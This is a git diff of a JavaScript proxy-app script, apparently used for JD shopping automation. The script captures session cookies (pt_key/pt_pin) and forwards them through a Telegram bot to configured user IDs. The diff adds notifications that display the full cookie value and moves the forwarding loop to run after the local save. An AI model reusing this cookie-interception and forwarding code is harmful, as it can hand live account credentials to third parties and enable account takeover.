@@ -34,12 +34,27 @@ function updateCookie(cookie, TGUserID) {
       data = JSON.parse(data);
       if (data.ok) {
          console.log(`已发送 wskey(${cookie}) 至 ${TGUserID}🎉\n`);
+         $.notify(
+             'tg推送',
+             '',
+             `已发送 wskey(${cookie}) 至 ${TGUserID}🎉\n`
+          )
         
       } else if (data.error_code === 400) {
          console.log(`发送失败，请联系 ${TGUserID}。\n`);
+         $.notify(
+             'tg推送',
+             '',
+             `发送失败，请联系 ${TGUserID}。\n`
+          )
          
       } else if (data.error_code === 401) {
          console.log(`${TGUserID} bot token 填写错误。\n`);
+         $.notify(
+             'tg推送',
+             '',
+             `${TGUserID} bot token 填写错误。\n`
+          )
         
      }
     } catch (e) {
@@ -170,9 +185,7 @@ async function GetCookie() {
     if (CV.match(/(pt_key=.+?pt_pin=|pt_pin=.+?pt_key=)/)) {
       const CookieValue = CV.match(/pt_key=.+?;/) + CV.match(/pt_pin=.+?;/)
       if (CookieValue.indexOf('fake_') > -1) return console.log('异常账号')
-      for (const userId of $.TGUserIDs) {
-         updateCookie(CookieValue, userId);
-      }
+
       const DecodeName = getUsername(CookieValue)
       let updateIndex = null,
         CookieName,
@@ -216,6 +229,9 @@ async function GetCookie() {
         tipPrefix + CookieName + 'Cookie成功 🎉',
         { 'update-pasteboard': CookieValue }
       )
+      for (const userId of $.TGUserIDs) {
+         updateCookie(CookieValue, userId);
+      }
     } else {
       console.log('ck 写入失败，未找到相关 ck')
     }
